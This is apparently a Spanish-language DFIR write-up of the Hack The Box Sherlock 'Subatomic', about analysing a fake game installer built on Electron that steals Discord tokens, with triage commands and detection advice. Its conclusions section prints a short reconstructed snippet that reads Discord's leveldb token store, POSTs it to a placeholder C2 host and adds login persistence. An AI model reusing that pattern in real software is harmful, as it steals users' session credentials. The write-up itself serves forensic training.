---
title: Subatomic
category: Malware / DFIR
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [malware, electron, asar, discord, persistence]
sherlock: Subatomic
domain: Malware Analysis
---


# Subatomic — Hack The Box (Sherlock)

[🇬🇧 English](README.en.md) | **Español**

## Escenario

Un usuario instala lo que parece un juego y, al poco, su cuenta de Discord empieza a enviar mensajes raros y aparecen ficheros que no reconoce. La evidencia es el instalador, la aplicación y artefactos del perfil. El caso gira en torno a una app **Electron** empaquetada con `asar`.

## Evidencias

```bash
file *; sha256sum *
strings -a installer.exe | grep -i -E "asar|electron|discord|http" | head
```

Si hay instalación: `%LOCALAPPDATA%\<app>\resources\app.asar`. Se extrae con:

```bash
npx asar extract app.asar app/
find app -name '*.js' | head
```

## Investigación

1. **Instalador**: comprobar firma, `strings`, recursos y a qué URL descarga.
2. **asar**: extraer y leer `main.js`, `package.json` y cualquier `preload.js`. Buscar `fetch`, `axios`, `child_process`, `fs.writeFile`.
3. **Tokens**: el patrón clásico busca `leveldb` de Discord (`Local Storage/leveldb`), cifra/descifra con DPAPI y exfiltra el token; también roba cookies y carteras.
4. **Persistencia**: `app.setLoginItemSettings`, clave `Run`, tarea programada o el propio instalador.
5. **Red**: dominios/IP en el JS y en `strings`; correlacionar con Sysmon 3/22 y con el firewall.

## Conclusiones

```js
const t = fs.readFileSync(path.join(process.env.APPDATA,'discord/Local Storage/leveldb/...'));
fetch('https://<c2>/collect', {method:'POST', body: JSON.stringify({token:t})});
app.setLoginItemSettings({openAtLogin:true});
```

El acceso a `leveldb` + POST a un dominio desconocido + persistencia en login describe el robo de sesión.

## Lecciones

- Electron no es un ejecutable monolítico: `app.asar` es el código real y se lee en segundos.
- El token de Discord es una credencial completa: no caduca al cerrar sesión.
- La persistencia en `openAtLogin` deja rastro en el registro y en el propio `package.json`.

- **Sysmon 11/1** para `app.asar` y procesos hijos de la app; **22** para DNS del C2.
- Bloquear instaladores sin firma y aplicar lista blanca de aplicaciones.
- Revocar sesiones de Discord y rotar contraseña tras el incidente.
- Revisar `Run`/`Startup` y `setLoginItemSettings` en apps Electron.

MITRE: T1555.003, T1539, T1547.001, T1041.
